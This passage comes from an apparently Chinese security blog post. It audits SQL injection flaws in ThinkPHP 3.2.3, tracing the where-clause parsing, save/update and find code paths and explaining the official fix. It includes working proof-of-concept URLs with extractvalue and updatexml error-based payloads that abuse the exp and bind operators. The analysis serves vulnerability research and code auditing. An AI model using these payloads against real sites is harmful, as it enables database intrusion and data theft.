class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ThinkPHP/Library/Think/Db/Driver.class.phpline:547-616</span><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseWhereItem</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$val</span></span>) </span>&#123;<br>        <span class="hljs-variable">$whereStr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$val</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(is_string(<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>])) &#123;<br><span class="hljs-variable">$exp</span>=strtolower(<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>]);<br>                <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^(eq|neq|gt|egt|lt|elt)$/&#x27;</span>,<span class="hljs-variable">$exp</span>)) &#123; <span class="hljs-comment">// 比较运算</span><br>                    parseValue()……;<br>                &#125;<span class="hljs-keyword">elseif</span>(preg_match(<span class="hljs-string">&#x27;/^(notlike|like)$/&#x27;</span>,<span class="hljs-variable">$exp</span>))&#123;<span class="hljs-comment">// 模糊查找</span><br>                    parseValue()……;<br>                &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-string">&#x27;bind&#x27;</span> == <span class="hljs-variable">$exp</span> )&#123; <span class="hljs-comment">// 使用表达式</span><br>                    <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; = :&#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br>                &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-string">&#x27;exp&#x27;</span> == <span class="hljs-variable">$exp</span> )&#123; <span class="hljs-comment">// 使用表达式</span><br>                    <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br>                &#125;<span class="hljs-keyword">elseif</span>(preg_match(<span class="hljs-string">&#x27;/^(notin|not in|in)$/&#x27;</span>,<span class="hljs-variable">$exp</span>))&#123; <span class="hljs-comment">// IN 运算</span><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$val</span>[<span class="hljs-number">2</span>]) &amp;&amp; <span class="hljs-string">&#x27;exp&#x27;</span>==<span class="hljs-variable">$val</span>[<span class="hljs-number">2</span>]) &#123;<br>                        <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;exp[<span class="hljs-variable">$exp</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        parseValue();<br>                    &#125;<br>                &#125;<span class="hljs-keyword">elseif</span>(preg_match(<span class="hljs-string">&#x27;/^(notbetween|not between|between)$/&#x27;</span>,<span class="hljs-variable">$exp</span>))&#123; <span class="hljs-comment">// BETWEEN运算</span><br>                   parseValue()……；<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    E(L(<span class="hljs-string">&#x27;_EXPRESS_ERROR_&#x27;</span>).<span class="hljs-string">&#x27;:&#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>]);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                ……<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//对字符串类型字段采用模糊匹配</span><br>            <span class="hljs-variable">$likeFields</span>   =   <span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;db_like_fields&#x27;</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$likeFields</span> &amp;&amp; preg_match(<span class="hljs-string">&#x27;/^(&#x27;</span>.<span class="hljs-variable">$likeFields</span>.<span class="hljs-string">&#x27;)$/i&#x27;</span>,<span class="hljs-variable">$key</span>)) &#123;<br>                <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; LIKE &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;parseValue(<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$val</span>.<span class="hljs-string">&#x27;%&#x27;</span>);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; = &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;parseValue(<span class="hljs-variable">$val</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$whereStr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就构造一个poc验证一下</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://tp.test:8888/index.php/home/index/test?name</span>[<span class="hljs-string">0</span>]=exp&amp;name[1]=111&#x27;<br></code></pre></td></tr></table></figure><p>然后跟踪调试过程发现并没有按照预想的进入<code>&#39;exp&#39; == $exp</code>的逻辑，原因是我们传入的exp被加了一个空格，这似乎和<strong>I方法</strong>有关系</p><img src="img/ThinkPHP3.x 漏洞总结/image-20210727161026613.png" alt="image-20210727161026613" style="zoom:50%;" /><p>所以这里也发现了官方为什么强调要使用I方法接收外部数据，<strong>如果没有使用I方法，而是直接使用<code>$_GET</code>等接收外部变量</strong>，那么这里就有sql注入的问题</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://tp.test:8888/index.php/home/index/test?name</span>[<span class="hljs-string">0</span>]=exp&amp;name[1]==<span class="hljs-emphasis">&#x27;1&#x27;</span> and (extractvalue(1,concat(0x7e,(select user()),0x7e))) #<br></code></pre></td></tr></table></figure><p>实际注入sql语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> `username`,`age` <span class="hljs-keyword">FROM</span> `think_user` <span class="hljs-keyword">WHERE</span> `username` <span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)))<br></code></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>目前分析了 ThinkPHP V3.2.3对通过<strong>I方法</strong>对输入变量的安全过滤流程、数据库在解析select语句中的where字段时的安全过滤流程。也发现如果没有按照规范的方法使用 ThinkPHP 也是有可能存在SQL注入问题的。这些不规范的写法也是代码审计时需要找出的问题</p><h1 id="0x03-历史漏洞"><a href="#0x03-历史漏洞" class="headerlink" title="0x03 历史漏洞"></a>0x03 历史漏洞</h1><h2 id="update注入漏洞"><a href="#update注入漏洞" class="headerlink" title="update注入漏洞"></a>update注入漏洞</h2><p>在安全过滤机制一节中主要分析了 select() 方法对 where() 传入的数组参数的处理过程，其中遇到了这样的情况：</p><ul><li><code>$exp</code>  的值为 ‘bind’ 时，构造的 where 字段中间会受到 “ = : “ 符号的影响，但是有人却找到了模型类的save()方法可以消除” : “的影响，最终造成sql注入漏洞，该小节就是关注这一点</li><li><code>$exp</code> 的值为 ‘exp’ 时，基本不会受到影响，但 exp 在 <code>think_filter()</code> 中是特殊字符，<code>$exp</code> 最终值会被加空格，无法进入到该逻辑中</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ThinkPHP/Library/Think/Db/Driver.class.php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseWhereItem</span>(<span class="hljs-params"></span>)</span>&#123;<br>……<br>    <span class="hljs-keyword">elseif</span>(<span class="hljs-string">&#x27;bind&#x27;</span> == <span class="hljs-variable">$exp</span> )&#123; <span class="hljs-comment">// 使用表达式</span><br>        <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; = :&#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br>    &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-string">&#x27;exp&#x27;</span> == <span class="hljs-variable">$exp</span> )&#123; <span class="hljs-comment">// 使用表达式</span><br>        <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br>    &#125;<br>……<br>&#125;<br><span class="hljs-comment">//ThinkPHP/Common/functions.php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">think_filter</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$value</span></span>)</span>&#123;<br><span class="hljs-comment">// TODO 其他安全过滤</span><br><span class="hljs-comment">// 过滤查询特殊字符</span><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>,<span class="hljs-variable">$value</span>))&#123;<br>        <span class="hljs-variable">$value</span> .= <span class="hljs-string">&#x27; &#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="save-的使用"><a href="#save-的使用" class="headerlink" title="save()的使用"></a>save()的使用</h3><p>ThinkPHP的模型基类使用save()方法实现了SQL update的操作，用法如下，要更改的数据需要通过数关联组形式传递</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;User&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br><span class="hljs-comment">// 要修改的数据对象属性赋值</span><br><span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;ThinkPHP&#x27;</span>;<br><span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;ThinkPHP@gmail.com&#x27;</span>;<br><span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-string">&#x27;id=5&#x27;</span>)-&gt;save(<span class="hljs-variable">$data</span>); <span class="hljs-comment">// 根据条件更新记录</span><br></code></pre></td></tr></table></figure><p>也可以改成对象方式来操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;User&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br><span class="hljs-comment">// 要修改的数据对象属性赋值</span><br><span class="hljs-variable">$User</span>-&gt;name = <span class="hljs-string">&#x27;ThinkPHP&#x27;</span>;<br><span class="hljs-variable">$User</span>-&gt;email = <span class="hljs-string">&#x27;ThinkPHP@gmail.com&#x27;</span>;<br><span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-string">&#x27;id=5&#x27;</span>)-&gt;save(); <span class="hljs-comment">// 根据条件更新记录</span><br></code></pre></td></tr></table></figure><h3 id="构造save-的场景"><a href="#构造save-的场景" class="headerlink" title="构造save()的场景"></a>构造save()的场景</h3><p>这里我们构建一个使用save()方法的场景，并且where()传入数组形式的参数，目的是为了进入bind的处理逻辑。外部参数我们使用严格<strong>I方法</strong>来接收</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br>        <span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br>        <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;jop&#x27;</span>] = <span class="hljs-string">&#x27;111&#x27;</span>;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;name&#x27;</span>=&gt;<span class="hljs-variable">$name</span>))-&gt;save(<span class="hljs-variable">$data</span>);<br>        var_dump(<span class="hljs-variable">$res</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>为了进入 ‘bind’ 的处理逻辑，下面将构造以下连接测试注入：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://tp.test:8888/index.php/home/index/test?name</span>[<span class="hljs-string">0</span>]=bind&amp;name[1]=kkey&#x27;<br></code></pre></td></tr></table></figure><h3 id="save-处理逻辑"><a href="#save-处理逻辑" class="headerlink" title="save()处理逻辑"></a>save()处理逻辑</h3><p>where() 的处理逻辑在安全过滤机制一节中有提到，当我们传入数组参数时在where()中不会被过滤，参数最终会被放到模型对象的 options 数组属性中保存。上面分析过select()怎么处理的options数组，现在将来 save() 的处理方式</p><blockquote><p>ThinkPHP/Library/Think/Model.class.php</p></blockquote><ul><li>where()方法上面已经分析过，只需要知道当前model类对象的<code>$options</code>存储着where字段的数据，<code>$data</code> 则是存放的set字段的数据</li><li><code>$data</code>，<code>$options</code> 是组成sql语句的关键，最终将交于 <code>db-&gt;update()</code> 实现</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ThinkPHP/Library/Think/Model.class.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span> </span>&#123;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br>    ……<br>       <span class="hljs-comment">//底层由数据库Driver类update()实现</span><br>        <span class="hljs-variable">$result</span>     =   <span class="hljs-keyword">$this</span>-&gt;db-&gt;update(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$options</span>);<br>……<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>ThinkPHP/Library/Think/Db/Driver.class.php</p></blockquote><p>把重点放到底层update()的实现上：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ThinkPHP/Library/Think/Db/Driver.class.php</span><br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Driver</span> </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$options</span></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span>  =   <span class="hljs-keyword">$this</span>-&gt;parseTable(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;table&#x27;</span>]);<br>    <span class="hljs-comment">//  此时sql语句构造为 UPDATE xxx set yyy </span><br>        <span class="hljs-variable">$sql</span>   = <span class="hljs-string">&#x27;UPDATE &#x27;</span> . <span class="hljs-variable">$table</span> . <span class="hljs-keyword">$this</span>-&gt;parseSet(<span class="hljs-variable">$data</span>);<br><span class="hljs-comment">//解析where字段</span><br>        <span class="hljs-variable">$sql</span> .= <span class="hljs-keyword">$this</span>-&gt;parseWhere(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>);<br>        ……<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;execute(<span class="hljs-variable">$sql</span>,!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;fetch_sql&#x27;</span>]) ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>首先 <code>$data</code> 由<strong>parseSet()<strong>解析为set字段，</strong>parseSet()</strong> 就不细看了，==该方法解析的set字段的将会用<strong>命名（:name）</strong>形式的占位标记符，其中占位标记符的值已经放在了bind数组中==，可以看出tp想做预编译的操作了</li></ul><img src="img/ThinkPHP3.x 漏洞总结/image-20210728160437576.png" alt="image-20210728160437576" style="zoom:50%;" /><ul><li><p>然后就进入where字段的解析，解析方法为 <code>parseWhere()</code></p><ul><li><p><code>parseWhere()</code> 也不进入细看了，就是数组参数最终会交给 <code>parseWhereItem()</code> 解析</p></li><li><p><code>parseWhereItem()</code>前面已有分析，这里也不再仔细分析了，当注入的<code>$exp</code>（代表运算符）等于bind时，传入的参数不会被过滤，而是在where字段中添加” =: “符号，本漏洞的关键点在于如何去消除这个” : “符号的影响</p><p>如下图，==where字段的数据奇怪的加入了这个预编译，明显where字段的值没有加入bind数组，这里也很关键，因为后面bind数组会被过滤==</p></li></ul></li></ul><img src="img/ThinkPHP3.x 漏洞总结/image-20210728160553076.png" alt="image-20210728160553076" style="zoom:50%;" /><ul><li><code>$sql</code> 为最终解析完成的sql语句，交于 <code>execute()</code> 执行</li></ul><hr><p>跟踪 execute() 方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ThinkPHP/Library/Think/Db/Driver.class.php</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$str</span>,<span class="hljs-variable">$fetchSql</span>=<span class="hljs-literal">false</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;queryStr = <span class="hljs-variable">$str</span>;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;bind))&#123;<br>            <span class="hljs-variable">$that</span>   =   <span class="hljs-keyword">$this</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;queryStr =   strtr(<span class="hljs-keyword">$this</span>-&gt;queryStr,array_map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$val</span></span>) <span class="hljs-keyword">use</span>(<span class="hljs-params"><span class="hljs-variable">$that</span></span>)</span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span>.<span class="hljs-variable">$that</span>-&gt;escapeString(<span class="hljs-variable">$val</span>).<span class="hljs-string">&#x27;\&#x27;&#x27;</span>; &#125;,<span class="hljs-keyword">$this</span>-&gt;bind));<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fetchSql</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;queryStr;<br>        &#125;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;bind <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;PDOStatement-&gt;bindValue(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$val</span>);<br>        &#125;<br>        <span class="hljs-variable">$result</span> =   <span class="hljs-keyword">$this</span>-&gt;PDOStatement-&gt;execute();<br></code></pre></td></tr></table></figure><ul><li><code>$str</code> 即为要执行的sql语句</li><li>重点关注 <code>$this-&gt;queryStr</code> 的处理，这里会执行两个函数，一个 <code>strst()</code> 字符串替换函数，一个使用<code>array_map()</code>调用的匿名函数<ul><li>匿名函数就是调用 <code>escapeString()</code> 过滤<strong>bind</strong>数组，前面知道 ==bind 数组只有set字段的值，where字段的值还是没有被过滤==</li><li><code>strst()</code> 将会把占位标记符转换为 bind 数组中对应的值，如：$bind=[‘:0’=&gt;’111’,’:1’=&gt;’222’]，那么sql语句中**’:0’<strong>字符会被替换为</strong>‘111’<strong>，</strong>‘:1’<strong>被替换为</strong>‘222’**。==利用的关键点来了，我们把where语句最终控制为”:0”，那么替换时”:”将被消除，从而消除了<code>:</code>对注入语句的影响==</li></ul></li></ul><img src="img/ThinkPHP3.x 漏洞总结/image-20210728163326968.png" alt="image-20210728163326968" style="zoom:50%;" /><ul><li><code>$this-&gt;queryStr</code> 语句处理好后，再通过预编译执行该语句，可惜其中的占位标记符已经被替换了，在预处理前就已经发生了注入，漏洞产生</li></ul><h3 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h3><p>poc如下，传入的name为数组，name[0]=bind目的是进入bind的逻辑，name[1]为payload数据，其中第一位字符要为0</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://tp.test:<span class="hljs-number">8888</span>/index.php/home/index/test?name[<span class="hljs-number">0</span>]=bind&amp;name[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span> and (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>))--+<br></code></pre></td></tr></table></figure><p>实际执行的sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">UPDATE `think_user` <span class="hljs-keyword">SET</span> `job`<span class="hljs-operator">=</span><span class="hljs-string">&#x27;111&#x27;</span> <span class="hljs-keyword">WHERE</span> `username` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;111&#x27;</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>验证图：</p><img src="img/ThinkPHP3.x 漏洞总结/image-20210728164652838.png" alt="image-20210728164652838" style="zoom: 33%;" /><h3 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h3><p>前面提到利用<strong>I方法</strong>获取输入时并没有过滤BIND，导致我们可以进入BIND的逻辑，从而使得我们的数组参数从头到尾都没有被过滤。官方便在这一点上做了过滤。所以该漏洞在ThinkPHP&lt;=3.2.3都是存在的</p><p>注意：如果没有使用<strong>I方法</strong>接收外部数据，那么下面的修复就没有意义了，这漏洞照样使用</p><img src="img/ThinkPHP3.x 漏洞总结/image-20210730161446223.png" alt="image-20210730161446223" style="zoom:50%;" /><h2 id="select-amp-delete-注入漏洞"><a href="#select-amp-delete-注入漏洞" class="headerlink" title="select&amp;delete 注入漏洞"></a>select&amp;delete 注入漏洞</h2><p>这其实是ThinkPHP的一个隐藏用法，在前面提到，ThinkPHP使用where()，field()等方法获取获取sql语句的各个部分，然后存放到当前模型对象的 <code>$this-&gt;options</code> 属性数组中，最后在使用 select() 这些方法从 <code>$this-&gt;options</code> 数组中解析出对应的sql语句执行</p><p>但在阅读代码过程中发现find()，select()，delete()本身可以接收 <code>$options</code> 数组参数，覆盖掉 <code>$this-&gt;options</code> 的值。不过这种用法官方文档并没有提及，想要遇到这中情况可能还需要开发者们配合，下面看看这个漏洞是怎么产生的，这里分析find()方法</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><blockquote><p>ThinkPHP/Library/Think/Model.class.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span> </span>&#123;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span>          =   <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find</span>(<span class="hljs-params"><span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(is_numeric(<span class="hljs-variable">$options</span>) || is_string(<span class="hljs-variable">$options</span>)) &#123;<span class="hljs-comment">//$options不为数组的情况</span><br>            <span class="hljs-variable">$where</span>[<span class="hljs-keyword">$this</span>-&gt;getPk()]  =   <span class="hljs-variable">$options</span>;<br>            <span class="hljs-variable">$options</span>                =   <span class="hljs-keyword">array</span>();<br>            <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>]       =   <span class="hljs-variable">$where</span>;<br>        &#125;<br>        <span class="hljs-comment">// 根据复合主键查找记录</span><br>        <span class="hljs-variable">$pk</span>  =  <span class="hljs-keyword">$this</span>-&gt;getPk();<br>        <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$options</span>) &amp;&amp; (count(<span class="hljs-variable">$options</span>) &gt; <span class="hljs-number">0</span>) &amp;&amp; is_array(<span class="hljs-variable">$pk</span>)) &#123;<span class="hljs-comment">//$options为数组且主键也为数组的情况</span><br>            <span class="hljs-comment">// 根据复合主键查询</span><br>          ……<br>        &#125;<br>      <span class="hljs-comment">// 总是查找一条记录</span><br>        <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]   =   <span class="hljs-number">1</span>;<br>        <span class="hljs-comment">// 分析表达式</span><br>        <span class="hljs-variable">$options</span>            =   <span class="hljs-keyword">$this</span>-&gt;_parseOptions(<span class="hljs-variable">$options</span>);<br>      ……<br>        <span class="hljs-variable">$resultSet</span>          =   <span class="hljs-keyword">$this</span>-&gt;db-&gt;select(<span class="hljs-variable">$options</span>);<span class="hljs-comment">//底层查询的语句</span><br></code></pre></td></tr></table></figure><ul><li><code>find()</code> 可以接收外部参数 <code>$options</code>，官方文档没有提及这个用法</li><li><code>getPk()</code> 获取当前的主键，默认为’id’</li><li><code>$options</code> 为数字类型或字符串类型时，<code>$where[&#39;id&#39;]=$options,$options[&#39;where&#39;]=$where</code>，该处只可以控制部分where字段的值，利用比较苛刻</li><li><code>$options</code> 为数组类型时，且主键 <code>$pk</code> 也为数组类型时，将会进入复合主键查询。但一般默认主键 <code>$pk=id</code>，不为数组</li><li><code>$options</code> 最终由 <code>_parseOptions()</code> 获取。跟踪 <code>_parseOptions()</code> 方法，可以看到最终 <code>$options</code> 将由**find()<strong>方法传入的<code>$options</code> 和</strong>where()**等方法传入的<code>$this-&gt;options</code>合并完成，注意<code>array_merge()</code>第二个参数是会覆盖第一个参数的值的，所以如果<code>find()</code>方法传入的<code>$options</code> 可控，那么整个sql语句也可控</li></ul><figure 